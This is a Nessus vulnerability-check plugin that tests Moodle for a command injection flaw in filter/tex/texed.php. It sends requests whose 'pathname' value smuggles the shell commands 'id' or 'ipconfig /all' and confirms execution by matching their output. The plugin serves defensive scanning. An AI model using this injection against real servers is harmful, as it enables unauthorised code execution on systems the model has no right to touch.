#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(35090);
  script_version("$Revision: 1.16 $");
  script_cvs_date("$Date: 2016/05/16 14:12:49 $");

  script_bugtraq_id(32801);
  script_osvdb_id(50810);

  script_name(english:"Moodle 'filter/tex/texed.php' 'pathname' Parameter Remote Command Execution");
  script_summary(english:"Attempts to run a command using Moodle.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that allows arbitrary
command execution.");
  script_set_attribute(attribute:"description", value:
"The version of Moodle installed on the remote host fails to sanitize
user-supplied input to the 'pathname' parameter before using it in the
'filter/tex/texed.php' script in a commandline that is passed to the
shell. Provided that PHP's 'register_globals' setting and the TeX
Notation filter has both been enabled and PHP's 'magic_quotes_gpc'
setting is disabled, an unauthenticated attacker can leverage these
issues to execute arbitrary code on the remote host subject to the
privileges of the web server user id.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/499172/30/0/threaded");
  script_set_attribute(attribute:"solution", value:"Disable PHP's 'register_globals'.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Moodle Tex Notification RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"plugin_publication_date", value:"2008/12/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:moodle:moodle");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("moodle_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("www/PHP", "installed_sw/Moodle");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

app = "Moodle";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
  {
    cmd = 'ipconfig /all';
    exploit = 'nessus" || ' + cmd + ' || echo ';
  }
  else
  {
    cmd = 'id';
    exploit = 'nessus";' + cmd + ';echo "';
  }
  exploits = make_list(exploit);
}
else exploits = make_list(
  'nessus";id;echo "',
  'nessus" || ipconfig /all || echo '
);
cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig'] = "Subnet Mask";

# try to run a command.
foreach exploit (exploits)
{
  url =
    "/filter/tex/texed.php?" +
    "formdata=" + SCRIPT_NAME + "&" +
    "pathname=" + urlencode(str:exploit);

  res = http_send_recv3(
    method : "GET",
    port   : port,
    item   : dir + url,
    exit_on_fail : TRUE
  );

  # There's a problem if we see the expected command output.
  if ('ipconfig' >< exploit) pat = cmd_pats['ipconfig'];
  else pat = cmd_pats['id'];

  if (egrep(pattern:pat, string:res[2]))
  {
    if (report_verbosity > 0)
    {
      req_str = install_url + url;
      report =
        '\n' + "Nessus was able to execute the command '" + cmd + "' on the remote" +
        '\n' + 'host using the following URL :' +
        '\n' +
        '\n' + "  " + req_str + 
        '\n';
      if (report_verbosity > 1)
      {
        output = res[2];
        output = output - strstr(output, 'Image not found!');
        if ('&pathname' >< output)
          output = output - strstr(output, ' -- ' + SCRIPT_NAME);

        report +=
          '\n' + 'It produced the following output :' +
          '\n' +
          '\n' + "  " + output + 
          '\n';
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
